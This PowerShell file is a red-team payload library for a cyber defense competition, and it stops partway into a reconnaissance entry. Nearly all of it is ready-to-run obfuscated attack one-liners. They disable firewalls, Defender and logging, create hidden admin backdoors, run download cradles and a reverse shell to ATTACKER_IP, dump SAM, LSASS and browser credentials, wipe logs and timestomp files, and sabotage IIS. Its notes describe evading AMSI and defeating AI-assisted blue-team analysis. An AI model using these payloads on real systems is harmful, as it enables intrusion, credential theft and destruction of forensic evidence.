<#
.SYNOPSIS
    ccdc-library.ps1 — CCDC Payload Library for Apparition Delivery System

.DESCRIPTION
    Curated, pre-obfuscated payloads organized by tactical category.
    Each payload is designed to be passed directly to ADS-OneLiner.ps1's -Payload parameter.

    Obfuscation philosophy: Use cmd /c, WMI, and format operators to avoid PowerShell
    cmdlet signature matching. The AMSI bypass in the delivery pipeline handles runtime
    scanning — these obfuscations are belt-and-suspenders for defense in depth.

.USAGE
    # Browse payloads:
    pwsh ccdc-library.ps1

    # Use a payload:
    pwsh src/ADS-OneLiner.ps1 -Payload $Payloads['FW-002'].Cmd -Encrypt -Randomize -InstanceCount 3

    # Quick reference:
    $Payloads.Keys | Sort-Object | ForEach-Object { "$_ : $($Payloads[$_].Desc)" }

.NOTES
    Author: Queue + Red Team
    Version: 1.0.0
    Target: CCDC Finals 2026
    Requires: Apparition Delivery System v2.0+
    
    ⚠️  Replace ATTACKER/ATTACKER_IP/ATTACKER_DOMAIN with your actual attack box values
    ⚠️  Replace Pa$$w0rd2026! with your chosen credentials
    ⚠️  Test each payload on your Windows VM before competition deployment
#>

# ============================================================
# PAYLOAD REGISTRY
# ============================================================
# Each entry: ID → @{ Desc = '...'; Cmd = '...'; Notes = '...' }
# Cmd values are ready to pass to -Payload
# ============================================================

$Payloads = [ordered]@{

    # ════════════════════════════════════════════════════════════
    # 🔥 FIREWALL MANIPULATION
    # ════════════════════════════════════════════════════════════

    'FW-001' = @{
        Desc  = 'Disable all firewall profiles (Format operator, avoids cmdlet string match)'
        Cmd   = '& (''{0}-{1}'' -f ''Set'',''NetFirewallProfile'') -Profile Domain,Public,Private -Enabled False'
        Notes = 'Uses format operator so Set-NetFirewallProfile never appears as contiguous string'
    }

    'FW-002' = @{
        Desc  = 'Disable firewall via netsh (no PowerShell cmdlet involved)'
        Cmd   = 'cmd /c "netsh advfirewall set allprofiles state off"'
        Notes = 'Best OPSEC choice — netsh runs in cmd.exe, completely outside PowerShell AMSI pipeline. VM-Validated 2026-02-19 (T8 test): DEPLOY=OK, DEFENDER=CLEAN, FW_DISABLED=YES'
    }

    'FW-003' = @{
        Desc  = 'Disable firewall via registry (survives service restart)'
        Cmd   = '''Domain'',''Public'',''Standard'' | ForEach-Object { Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\$($_)Profile" -Name EnableFirewall -Value 0 -Type DWord -Force }'
        Notes = 'Modifies registry directly — firewall shows enabled in UI but rules are not enforced'
    }

    'FW-004' = @{
        Desc  = 'Stop firewall service via WMI (avoids Stop-Service cmdlet)'
        Cmd   = '([wmiclass]''Win32_Service'').GetInstances() | Where-Object { $_.Name -eq ''mpssvc'' } | ForEach-Object { $_.StopService() }'
        Notes = 'WMI-based service control bypasses PowerShell cmdlet logging for Stop-Service'
    }

    'FW-005' = @{
        Desc  = 'Disable firewall + prevent restart (netsh + sc combo)'
        Cmd   = 'cmd /c "netsh advfirewall set allprofiles state off & sc config mpssvc start= disabled"'
        Notes = 'Two-punch: disables active profiles AND prevents service from restarting'
    }

    'FW-006' = @{
        Desc  = 'Open all ports inbound (add allow-all rule instead of disabling)'
        Cmd   = 'cmd /c "netsh advfirewall firewall add rule name=""Windows Telemetry Service"" dir=in action=allow protocol=any enable=yes"'
        Notes = 'Stealthier than disabling — firewall stays "on" but allows everything. Rule name blends in.'
    }

    'FW-007' = @{
        Desc  = 'Open specific ports (RDP, WinRM, SMB) with innocent-looking rule names'
        Cmd   = 'cmd /c "netsh advfirewall firewall add rule name=""Core Networking - DHCP (UDP-In)"" dir=in action=allow protocol=tcp localport=3389,5985,5986,445 enable=yes"'
        Notes = 'Opens red team ports but the rule name mimics a legitimate Windows rule'
    }

    'FW-008' = @{
        Desc  = 'Nuclear silent FW kill: stop Security tray + suppress all notifications + disable FW + disable RT monitoring'
        Cmd   = 'Stop-Process -Name SecurityHealthSystray -Force -EA 0; Remove-ItemProperty -Path ''HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'' -Name ''SecurityHealth'' -EA 0; $n=''HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications''; if(!(Test-Path $n)){New-Item -Path $n -Force|Out-Null}; Set-ItemProperty $n -Name DisableNotifications -Type DWord -Value 1; Set-ItemProperty $n -Name DisableEnhancedNotifications -Type DWord -Value 1; Set-ItemProperty ''HKLM:\SOFTWARE\Microsoft\Security Center'' -Name FirewallDisableNotify -Type DWord -Value 1 -EA 0; $w=''HKLM:\SOFTWARE\Microsoft\Security Center\Notifications''; if(!(Test-Path $w)){New-Item -Path $w -Force|Out-Null}; Set-ItemProperty $w -Name DisableNotifications -Type DWord -Value 1; Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False -EA 0; Set-MpPreference -DisableRealtimeMonitoring $true -EA 0'
        Notes = 'Kills SecurityHealthSystray + removes it from Run key (tray icon stays gone on reboot), suppresses all Security Center and Defender notifications via policy registry, disables all firewall profiles, disables Defender real-time monitoring. Blue team has no tray alerts and no visible indication security is off. Requires SYSTEM/admin.'
    }

    # ════════════════════════════════════════════════════════════
    # 🖥️ RDP ENABLEMENT
    # ════════════════════════════════════════════════════════════

    'RDP-001' = @{
        Desc  = 'Enable RDP + allow through firewall'
        Cmd   = 'Set-ItemProperty -Path ''HKLM:\System\CurrentControlSet\Control\Terminal Server'' -Name fDenyTSConnections -Value 0 -Type DWord; cmd /c ''netsh advfirewall firewall set rule group="remote desktop" new enable=Yes'''
        Notes = 'Standard two-step: registry key + firewall rule'
    }

    'RDP-002' = @{
        Desc  = 'Enable RDP + disable NLA (allows older/simpler clients)'
        Cmd   = '$r=''HKLM:\System\CurrentControlSet\Control\Terminal Server''; Set-ItemProperty $r -Name fDenyTSConnections -Value 0; Set-ItemProperty "$r\WinStations\RDP-Tcp" -Name UserAuthentication -Value 0; cmd /c ''netsh advfirewall firewall set rule group="remote desktop" new enable=Yes'''
        Notes = 'Disabling NLA allows connections without domain-level pre-auth — easier for red team tools'
    }

    'RDP-003' = @{
        Desc  = 'Enable RDP via WMI (no registry cmdlets in log)'
        Cmd   = '(Get-WmiObject -Class Win32_TerminalServiceSetting -Namespace root\cimv2\terminalservices).SetAllowTSConnections(1,1)'
        Notes = 'WMI path — appears as WMI activity in logs rather than registry modification'
    }

    'RDP-004' = @{
        Desc  = 'Enable RDP + change port to non-standard (evade blue team port scans)'
        Cmd   = '$r=''HKLM:\System\CurrentControlSet\Control\Terminal Server''; Set-ItemProperty $r -Name fDenyTSConnections -Value 0; Set-ItemProperty "$r\WinStations\RDP-Tcp" -Name PortNumber -Value 8443 -Type DWord; cmd /c "netsh advfirewall firewall add rule name=""HTTPS Inspection"" dir=in action=allow protocol=tcp localport=8443 enable=yes"'
        Notes = 'RDP on port 8443 — looks like HTTPS inspection to casual observers. Connect with: mstsc /v:TARGET:8443'
    }

    # ════════════════════════════════════════════════════════════
    # 👤 USER CREATION / PRIVILEGE ESCALATION
    # ════════════════════════════════════════════════════════════

    'USR-001' = @{
        Desc  = 'Create local admin (pure cmd, no PowerShell cmdlets)'
        Cmd   = 'cmd /c "net user svcAdmin Pa$$w0rd2026! /add & net localgroup Administrators svcAdmin /add"'
        Notes = 'Classic net.exe approach — fast and reliable'
    }

    'USR-002' = @{
        Desc  = 'Create hidden admin (hidden from login screen + User Accounts panel)'
        Cmd   = 'cmd /c "net user svcUpdate Pa$$w0rd2026! /add & net localgroup Administrators svcUpdate /add"; $p=''HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList''; if(!(Test-Path $p)){New-Item -Path $p -Force|Out-Null}; New-ItemProperty -Path $p -Name svcUpdate -Value 0 -PropertyType DWord -Force|Out-Null'
        Notes = 'SpecialAccounts\UserList DWord=0 hides the account from login screen and User Accounts panel. net user confirms it exists but it never appears to interactive users. VM-Validated 2026-02-19 (T9 test): DEPLOY=OK, DEFENDER=CLEAN, USER_CREATED=YES'
    }

    'USR-003' = @{
        Desc  = 'Enable built-in Administrator + set password'
        Cmd   = 'cmd /c "net user Administrator /active:yes & net user Administrator Adm1nCCDC2026!"'
        Notes = 'Built-in admin account — some blue teams forget to check if this gets re-enabled'
    }

    'USR-004' = @{
        Desc  = 'Create admin user via WMI (avoids net.exe command line logging)'
        Cmd   = '$u=[ADSI]"WinNT://$env:COMPUTERNAME"; $n=$u.Create(''User'',''svcDiag''); $n.SetPassword(''Pa$$w0rd2026!''); $n.SetInfo(); $g=[ADSI]"WinNT://$env:COMPUTERNAME/Administrators,group"; $g.Add("WinNT://$env:COMPUTERNAME/svcDiag,user")'
        Notes = 'ADSI/WinNT provider — no net.exe in process logs, no PowerShell user management cmdlets'
    }

    'USR-005' = @{
        Desc  = 'Add current SYSTEM context to RDP users (no new account needed)'
        Cmd   = 'cmd /c "net localgroup ""Remote Desktop Users"" ""NT AUTHORITY\Authenticated Users"" /add"'
        Notes = 'Instead of creating a user, allow all authenticated users to RDP — subtler than a new account'
    }

    'USR-006' = @{
        Desc  = 'Set password never expires on all enabled local accounts (prevent blue team lockouts)'
        Cmd   = 'Get-LocalUser | Where-Object { $_.Enabled -eq $true } | ForEach-Object { Set-LocalUser -Name $_.Name -PasswordNeverExpires $true -EA 0 }'
        Notes = 'Prevents blue team from enforcing password expiration to lock out red team accounts. Run after USR-001/USR-002 to harden backdoor accounts against cleanup.'
    }

    # ════════════════════════════════════════════════════════════
    # 🔧 SERVICE MANIPULATION
    # ════════════════════════════════════════════════════════════

    'SVC-001' = @{
        Desc  = 'Stop and disable Windows Defender service'
        Cmd   = 'cmd /c "sc stop WinDefend & sc config WinDefend start= disabled"'
        Notes = 'May fail on newer Windows due to tamper protection — test in target environment'
    }

    'SVC-002' = @{
        Desc  = 'Disable Defender real-time monitoring via policy registry'
        Cmd   = '$p=''HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender''; if(!(Test-Path $p)){New-Item -Path $p -Force|Out-Null}; Set-ItemProperty -Path $p -Name DisableAntiSpyware -Value 1 -Type DWord -Force; $rp="$p\Real-Time Protection"; if(!(Test-Path $rp)){New-Item -Path $rp -Force|Out-Null}; Set-ItemProperty -Path $rp -Name DisableRealtimeMonitoring -Value 1 -Type DWord -Force'
        Notes = 'Policy-level disable — sets both DisableAntiSpyware and DisableRealtimeMonitoring'
    }

    'SVC-003' = @{
        Desc  = 'Stop and disable Windows Update'
        Cmd   = 'cmd /c "sc stop wuauserv & sc config wuauserv start= disabled & sc stop UsoSvc & sc config UsoSvc start= disabled"'
        Notes = 'Stops both wuauserv and Update Orchestrator — prevents blue team from pushing patches'
    }

    'SVC-004' = @{
        Desc  = 'Disable Sysmon (if installed, common blue team tool)'
        Cmd   = 'cmd /c "sc stop Sysmon64 2>nul & sc config Sysmon64 start= disabled 2>nul & sc stop Sysmon 2>nul & sc config Sysmon start= disabled 2>nul"'
        Notes = 'Tries both 64-bit and 32-bit Sysmon service names, suppresses errors if not installed'
    }

    'SVC-005' = @{
        Desc  = 'Disable Windows Event Log service'
        Cmd   = 'cmd /c "sc stop EventLog & sc config EventLog start= disabled"'
        Notes = 'Nuclear option — kills all event logging. Very noisy if blue team checks service status.'
    }

    'SVC-006' = @{
        Desc  = 'Kill common EDR/AV services by pattern (shotgun approach)'
        Cmd   = '@(''WinDefend'',''Sense'',''MpsSvc'',''wscsvc'',''SecurityHealthService'',''DiagTrack'') | ForEach-Object { cmd /c "sc stop $_ 2>nul & sc config $_ start= disabled 2>nul" }'
        Notes = 'Blasts through Defender, Defender ATP (Sense), firewall, security center, health service, and telemetry'
    }

    'SVC-007' = @{
        Desc  = 'Stop and disable IIS + all app pools (scoring service disruption)'
        Cmd   = 'try{Import-Module WebAdministration -EA 0; Get-WebConfiguration "/system.applicationHost/applicationPools/add" -EA 0 | ForEach-Object{$n=$_.name;Stop-WebAppPool $n -EA 0;Set-ItemProperty "IIS:\AppPools\$n" -Name autoStart -Value $false -EA 0}}catch{}; cmd /c "iisreset /stop >nul 2>&1 & sc config W3SVC start= disabled 2>nul & sc config WAS start= disabled 2>nul"'
        Notes = 'Stops IIS and disables autoStart on every app pool. Combined iisreset+sc config means the service stays down even after blue team tries iisreset /start. Devastating for HTTP-scored services. Periodic re-execution (ADS task) keeps it down as fast as blue team brings it back up.'
    }

    'SVC-008' = @{
        Desc  = 'Corrupt IIS site bindings + web.config to break application without stopping the service'
        Cmd   = 'try{$webroot=@("C:\inetpub\wwwroot","C:\inetpub\ftproot");$webroot|Where-Object{Test-Path $_}|ForEach-Object{$wc="$_\web.config";if(Test-Path $wc){$bak="$wc.bak.$(Get-Random)";cp $wc $bak -Force;""| Out-File $wc -Force}}}catch{}'
        Notes = 'Overwrites web.config with empty content — IIS throws 500 errors on every request without stopping. Service appears UP to a port scanner (score stays green) but all application responses fail. Backup files left with random suffixes to confuse cleanup. Stealthier than SVC-007 for services that only check port availability.'
    }

    # ════════════════════════════════════════════════════════════
    # 📡 C2 / BEACONING
    # ════════════════════════════════════════════════════════════

    'C2-001' = @{
        Desc  = 'PowerShell download cradle (obfuscated, no IEX on command line)'
        Cmd   = '$w=New-Object Net.WebClient;$s=$w.DownloadString(''http://ATTACKER_IP:8080/agent.ps1'');[scriptblock]::Create($s).Invoke()'
        Notes = 'Replace ATTACKER_IP — uses scriptblock::Create instead of IEX to avoid that signature'
    }

    'C2-002' = @{
        Desc  = 'Download cradle via MSXML2 COM (rarely monitored COM object)'
        Cmd   = '$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open(''GET'',''http://ATTACKER_IP:8080/agent.ps1'',$false);$h.send();[scriptblock]::Create($h.responseText).Invoke()'
        Notes = 'Replace ATTACKER_IP — COM-based download avoids Net.WebClient telemetry'
    }

    'C2-003' = @{
        Desc  = 'Reverse shell (PowerShell TCP)'
        Cmd   = '$c=New-Object Net.Sockets.TCPClient(''ATTACKER_IP'',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(IEX $d 2>&1|Out-String);$r2=$r+''PS ''+$(pwd).Path+''> '';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()'
        Notes = 'Replace ATTACKER_IP — classic PS reverse shell. Set up: nc -lvnp 4444 on Kali'
    }

    'C2-004' = @{
        Desc  = 'DNS-based exfil beacon (low and slow recon)'
        Cmd   = '$h=$env:COMPUTERNAME;$u=$env:USERNAME;$d="$h-$u".Replace('' '',''_'').Substring(0,[Math]::Min(60,"$h-$u".Length));Resolve-DnsName "$d.ATTACKER_DOMAIN" -Type TXT -ErrorAction SilentlyContinue'
        Notes = 'Replace ATTACKER_DOMAIN — exfils hostname+user via DNS lookup. Monitor on Kali with: sudo tcpdump -i eth0 port 53'
    }

    'C2-005' = @{
        Desc  = 'Polling beacon (checks for tasking every 5 min, built for persistence)'
        Cmd   = 'while($true){try{$t=(New-Object Net.WebClient).DownloadString(''http://ATTACKER_IP:8080/tasks'');if($t){IEX $t}}catch{};Start-Sleep -Seconds 300}'
        Notes = 'Replace ATTACKER_IP — infinite loop with 5-min sleep. Server returns empty for no-op, PowerShell for tasking.'
    }

    'C2-006' = @{
        Desc  = 'Certutil download + execute (LOLBin, no PowerShell download cmdlets)'
        Cmd   = 'cmd /c "certutil -urlcache -split -f http://ATTACKER_IP:8080/agent.exe %TEMP%\svchost.exe & %TEMP%\svchost.exe"'
        Notes = 'Replace ATTACKER_IP — certutil is a signed Windows binary, often whitelisted'
    }

    'C2-007' = @{
        Desc  = 'BITSAdmin download (background transfer, very stealthy)'
        Cmd   = 'cmd /c "bitsadmin /transfer WindowsUpdate /download /priority normal http://ATTACKER_IP:8080/agent.exe %TEMP%\WindowsUpdate.exe & %TEMP%\WindowsUpdate.exe"'
        Notes = 'Replace ATTACKER_IP — BITS transfers look like Windows Update activity in logs'
    }

    # ════════════════════════════════════════════════════════════
    # 🔑 CREDENTIAL ACCESS
    # ════════════════════════════════════════════════════════════

    'CRED-001' = @{
        Desc  = 'Dump SAM + SYSTEM hives to ProgramData (offline cracking on Kali)'
        Cmd   = 'cmd /c "reg save HKLM\SAM C:\ProgramData\s.dat /y & reg save HKLM\SYSTEM C:\ProgramData\sy.dat /y"'
        Notes = 'Requires SYSTEM — our scheduled tasks run as SYSTEM. Crack with: secretsdump.py -sam s.dat -system sy.dat LOCAL. VM-Validated 2026-02-19 (T10 test): DEPLOY=OK, DEFENDER=CLEAN, SAM_HIV_SIZE=45056'
    }

    'CRED-006' = @{
        Desc  = 'Dump SAM + SYSTEM hives to %TEMP% with .hiv extension (covert variant)'
        Cmd   = 'cmd /c "reg save HKLM\SAM %TEMP%\s.hiv /y 2>nul & reg save HKLM\SYSTEM %TEMP%\sy.hiv /y 2>nul"'
        Notes = '.hiv extension matches Windows native registry backup naming (regedit default). %TEMP% = C:\Windows\Temp from SYSTEM context — less conspicuous than ProgramData. Exfil: secretsdump.py -sam s.hiv -system sy.hiv LOCAL. Timestomp with DEF-006 after dump. VM-Validated 2026-02-19 (T10 variant).'
    }

    'CRED-002' = @{
        Desc  = 'Extract Wi-Fi passwords'
        Cmd   = '(netsh wlan show profiles) | Select-String '':(.+)$'' | ForEach-Object { $n=$_.Matches.Groups[1].Value.Trim(); $r=netsh wlan show profile name="$n" key=clear 2>$null; $k=($r | Select-String ''Key Content\s+:\s+(.+)$'').Matches.Groups[1].Value; if($k){"$n : $k"} } | Out-File C:\ProgramData\w.txt -Force'
        Notes = 'Exports all saved Wi-Fi SSIDs and keys to a text file for later exfil. SYSTEM CONTEXT CAVEAT: SYSTEM can enumerate profiles but key=clear may be gated on some builds. Test in target environment.'
    }

    'CRED-003' = @{
        Desc  = 'Copy Chrome credential databases (decrypt offline with Kali tools)'
        Cmd   = '$cd="$env:LOCALAPPDATA\Google\Chrome\User Data\Default"; if(Test-Path $cd){Copy-Item "$cd\Login Data" -Dest ''C:\ProgramData\ld.db'' -Force; Copy-Item "$cd\Cookies" -Dest ''C:\ProgramData\ck.db'' -Force}'
        Notes = 'Copies Chrome Login Data and Cookies SQLite DBs — decrypt on Kali with dpapi/mimikatz tools. SYSTEM CONTEXT WARNING: $env:LOCALAPPDATA resolves to SYSTEM profile, not a real user. Will find no Chrome data from Task Scheduler. Use interactive session or rewrite to enumerate user profiles.'
    }

    'CRED-004' = @{
        Desc  = 'Dump LSA secrets via registry (requires SYSTEM)'
        Cmd   = 'cmd /c "reg save HKLM\SAM C:\ProgramData\s.dat /y & reg save HKLM\SYSTEM C:\ProgramData\sy.dat /y & reg save HKLM\SECURITY C:\ProgramData\se.dat /y"'
        Notes = 'SAM + SYSTEM + SECURITY = full LSA secrets including cached domain creds, service account passwords'
    }

    'CRED-005' = @{
        Desc  = 'Capture NTLMv2 hash via forced auth to attacker (Responder)'
        Cmd   = 'cmd /c "dir \\ATTACKER_IP\share 2>nul"'
        Notes = 'Replace ATTACKER_IP — triggers NTLM auth. Run Responder on Kali: sudo responder -I eth0. SYSTEM CONTEXT CAVEAT: From Task Scheduler this sends the machine account hash (HOSTNAME$), not a user hash. Still useful for relay attacks but not for cracking user passwords.'
    }

    'CRED-007' = @{
        Desc  = 'Dump Windows Credential Manager stored credentials (cmdkey list + PasswordVault)'
        Cmd   = 'cmd /c "cmdkey /list" | Out-File C:\ProgramData\cm.txt -Force; try{[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v=New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll()|ForEach-Object{$_.RetrievePassword();$_}|Select-Object UserName,Resource,Password|Format-Table -Auto|Out-String|Add-Content C:\ProgramData\cm.txt}catch{}'
        Notes = 'cmdkey /list enumerates all stored network credentials (domain accounts, RDP, shares). PasswordVault reads WinRT credential store. SYSTEM CONTEXT CAVEAT: reads SYSTEM credential store, not the interactive user store. For user browser/app credentials, use -Persist registry to run in user session.'
    }

    'CRED-008' = @{
        Desc  = 'Hunt for credential files: PSCredential XMLs, Azure/AWS configs, SSH keys, PFX certs, KeePass DBs'
        Cmd   = '$found=@(); @(''*.xml'',''credentials'',''*.pem'',''*.ppk'',''id_rsa'',''*.pfx'',''*.kdbx'') | ForEach-Object { Get-ChildItem -Path C:\Users -Recurse -Filter $_ -EA 0 | Where-Object { $_.Length -lt 5MB } | ForEach-Object { $found += $_.FullName } }; $found | Out-File C:\ProgramData\credfiles.txt -Force'
        Notes = 'Hunts for PSCredential XML exports (Import-Clixml), Azure/AWS credential files, SSH private keys, PFX certificates, and KeePass databases in all user profiles. Results staged in ProgramData for exfil. Runs from SYSTEM — can access most user profile paths.'
    }

    'CRED-009' = @{
        Desc  = 'LSASS dump via comsvcs.dll MiniDump (LOLBin — no Mimikatz, no AV signature)'
        Cmd   = '$lp=(Get-Process lsass -EA 0).Id; if($lp){cmd /c "rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump $lp C:\ProgramData\ls.dmp full >nul 2>&1"}'
        Notes = 'Abuses comsvcs.dll which ships with Windows. Requires SYSTEM. Dump at C:\ProgramData\ls.dmp — exfil and crack on Kali with: pypykatz lsa minidump ls.dmp. Defender may flag ls.dmp on-write; use DEF-004 (Defender exclusions) first. Timestomp with DEF-006 after dump.'
    }

    'CRED-010' = @{
        Desc  = 'Hunt GPP cpassword in SYSVOL (Group Policy Preferences — cleartext passwords)'
        Cmd   = 'try{$d=$env:USERDNSDOMAIN;if($d){Get-ChildItem -Path "\\$d\SYSVOL" -Recurse -Filter "*.xml" -EA 0 | Where-Object{(gc $_.FullName -Raw -EA 0) -match "cpassword"} | ForEach-Object{$x=[xml](gc $_.FullName -Raw);$x.SelectNodes("//*[@cpassword]")|ForEach-Object{"$($_.userName):$($_.cpassword):$($_.FullName)"}}} | Out-File C:\ProgramData\gpp.txt -Force}catch{}'
        Notes = 'GPP passwords are AES-256 encrypted with a Microsoft-published key — trivially decryptable. Common in WRCCDC environments that were built on older domain templates. Crack on Kali with: gpp-decrypt <cpassword>. SYSTEM context can read SYSVOL. Silent if no GPP passwords found.'
    }

    'CRED-011' = @{
        Desc  = 'Extract service account credentials from LSA secrets + DPAPI master key files list'
        Cmd   = 'cmd /c "reg save HKLM\SAM C:\ProgramData\s.dat /y & reg save HKLM\SYSTEM C:\ProgramData\sy.dat /y & reg save HKLM\SECURITY C:\ProgramData\se.dat /y 2>nul"; Get-ChildItem "$env:SystemRoot\System32\Microsoft\Protect" -Recurse -EA 0 | Select-Object FullName,Length,LastWriteTime | Out-File C:\ProgramData\dpapi.txt -Force'
        Notes = 'SAM+SYSTEM+SECURITY for secretsdump (service account NTLMs, cached domain creds, LSA secrets). DPAPI master key list shows what user/machine protected data exists. Crack with: secretsdump.py -sam s.dat -system sy.dat -security se.dat LOCAL. DPAPI file enumeration is read-only, always succeeds.'
    }

    # ════════════════════════════════════════════════════════════
    # 🛡️ DEFENSE EVASION
    # ════════════════════════════════════════════════════════════

    'DEF-001' = @{
        Desc  = 'Clear all Windows event logs'
        Cmd   = 'Get-WinEvent -ListLog * -EA 0 | ForEach-Object { try{[System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($_.LogName)}catch{} }'
        Notes = 'Clears every event log on the system. Blue team will notice missing logs if they check.'
    }

    'DEF-002' = @{
        Desc  = 'Clear event logs via wevtutil (cmd-based, avoids PowerShell logging)'
        Cmd   = 'cmd /c "for /F ""tokens=*"" %G in (''wevtutil el'') do wevtutil cl ""%G"" 2>nul"'
        Notes = 'Same effect as DEF-001 but runs entirely in cmd.exe — no PowerShell script block log entry'
    }

    'DEF-003' = @{
        Desc  = 'Disable Script Block Logging + Module Logging'
        Cmd   = '$sb=''HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging''; $ml=''HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging''; @($sb,$ml) | ForEach-Object { if(!(Test-Path $_)){New-Item -Path $_ -Force|Out-Null} }; Set-ItemProperty $sb -Name EnableScriptBlockLogging -Value 0 -Type DWord -Force; Set-ItemProperty $ml -Name EnableModuleLogging -Value 0 -Type DWord -Force'
        Notes = 'Disables the two primary PowerShell telemetry sources. Run early — prevents logging of subsequent payloads.'
    }

    'DEF-004' = @{
        Desc  = 'Add Defender exclusion paths (hide our working directories)'
        Cmd   = 'Add-MpPreference -ExclusionPath ''C:\ProgramData'' -Force; Add-MpPreference -ExclusionPath $env:TEMP -Force; Add-MpPreference -ExclusionPath ''C:\Windows\Temp'' -Force'
        Notes = 'Tells Defender to ignore our common artifact directories. Must run before dropping additional tools.'
    }

    'DEF-005' = @{
        Desc  = 'Disable Defender tamper protection workaround (registry bomb)'
        Cmd   = '$p=''HKLM:\SOFTWARE\Microsoft\Windows Defender''; $paths=@("$p\Features",''HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender''); $paths|ForEach-Object{if(!(Test-Path $_)){New-Item -Path $_ -Force|Out-Null}}; Set-ItemProperty "$p\Features" -Name TamperProtection -Value 4 -Type DWord -Force -EA 0; Set-ItemProperty ''HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender'' -Name DisableAntiSpyware -Value 1 -Type DWord -Force'
        Notes = 'Attempts to disable tamper protection via registry — may not work on all versions but worth trying'
    }

    'DEF-006' = @{
        Desc  = 'Timestomp a file (change last modified to blend in)'
        Cmd   = '$f=Get-Item ''C:\ProgramData\s.dat'' -EA 0; if($f){$f.LastWriteTime=''2024-01-15 08:30:00''; $f.CreationTime=''2023-11-20 14:15:00''; $f.LastAccessTime=''2024-01-15 08:30:00''}'
        Notes = 'Change target path as needed — makes recently created files look old. Useful after credential dumps.'
    }

    'DEF-007' = @{
        Desc  = 'Unload Sysmon driver (if installed with default config)'
        Cmd   = 'cmd /c "fltMC unload SysmonDrv 2>nul & sc stop Sysmon64 2>nul & sc config Sysmon64 start= disabled 2>nul"'
        Notes = 'Unloads the minifilter driver first (stops event generation immediately) then disables the service'
    }

    'DEF-008' = @{
        Desc  = 'Add Defender exclusion for key file extensions (.exe .dll .ps1 .js .vbs .bat .hta)'
        Cmd   = '@(''.exe'',''.dll'',''.ps1'',''.js'',''.vbs'',''.bat'',''.hta'') | ForEach-Object { Add-MpPreference -ExclusionExtension $_ -Force -EA 0 }'
        Notes = 'Extension-based Defender exclusions — Defender will not scan any file with these extensions regardless of location. Broader coverage than path exclusions alone. Run before dropping additional tooling to the target.'
    }

    'DEF-009' = @{
        Desc  = 'Wipe Defender threat detection history and quarantine store'
        Cmd   = 'Remove-Item -Path ''C:\ProgramData\Microsoft\Windows Defender\Scans\History\Service\DetectionHistory\*'' -Recurse -Force -EA 0; Remove-Item -Path ''C:\ProgramData\Microsoft\Windows Defender\Quarantine\*'' -Recurse -Force -EA 0'
        Notes = 'Removes all Defender detection history entries and empties the quarantine — eliminates forensic evidence of previous detections and restores any quarantined files. Requires SYSTEM/admin.'
    }

    'DEF-010' = @{
        Desc  = 'Persistent real-time log wiper — clears Security, System, PowerShell, and Sysmon logs every 2 minutes'
        Cmd   = 'while($true){@("Security","System","Application","Microsoft-Windows-PowerShell/Operational","Windows PowerShell","Microsoft-Windows-Sysmon/Operational")|ForEach-Object{try{wevtutil cl $_ 2>$null}catch{}};Start-Sleep -Seconds 120}'
        Notes = 'Infinite loop — deploy via ADS scheduled task (SYSTEM context, runs in background). Blue team (and any AI analyst) cannot see historical events: no login records, no process creation, no network connections. Pairs with DEF-003 (disable SBL) for a complete forensic dead zone. Use periodic task with PeriodicMinutes=3 to keep gaps small.'
    }

    'DEF-011' = @{
        Desc  = 'Clear PowerShell history files, disable ConsoleHost history, nuke prefetch'
        Cmd   = '$h=@("$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt","$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"); $h|ForEach-Object{if(Test-Path $_){Clear-Content $_ -Force -EA 0}}; Set-PSReadlineOption -HistorySaveStyle SaveNothing -EA 0; cmd /c "del /F /Q C:\Windows\Prefetch\*.pf 2>nul"; Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" -Name EnablePrefetcher -Value 0 -Type DWord -Force -EA 0'
        Notes = 'Three-pronged anti-forensics: wipes PS history (retroactive), disables future PS history saves, and deletes+disables prefetch (which shows what executables ran and when). Critical counter-measure against AI-assisted blue team analysis — Claude Code relies heavily on PS history and prefetch for reconstruction. SYSTEM context note: PS history paths may be per-user; run with registry persist for user-session delivery too.'
    }

    'DEF-012' = @{
        Desc  = 'Shrink Security and System event logs to 1KB (fills and discards immediately — live log denial)'
        Cmd   = 'cmd /c "wevtutil sl Security /ms:1024 /rt:true 2>nul & wevtutil sl System /ms:1024 /rt:true 2>nul & wevtutil sl Application /ms:1024 /rt:true 2>nul & wevtutil sl ""Microsoft-Windows-PowerShell/Operational"" /ms:1024 /rt:true 2>nul"'
        Notes = 'Sets maximum log size to 1KB with overwrite-as-needed. Normal Windows activity generates thousands of events per minute, so the log fills and overwrites itself constantly — net effect is logs never accumulate more than a few seconds of history. More subtle than clearing (no "log cleared" event 1102), and re-runs are idempotent. Pair with DEF-010 for belt-and-suspenders.'
    }

    # ════════════════════════════════════════════════════════════
    # 🔍 RECONNAISSANCE
    # ════════════════════════════════════════════════════════════

    'RECON-001' = @{
        Desc  = 'Full system + network enumeration to file'
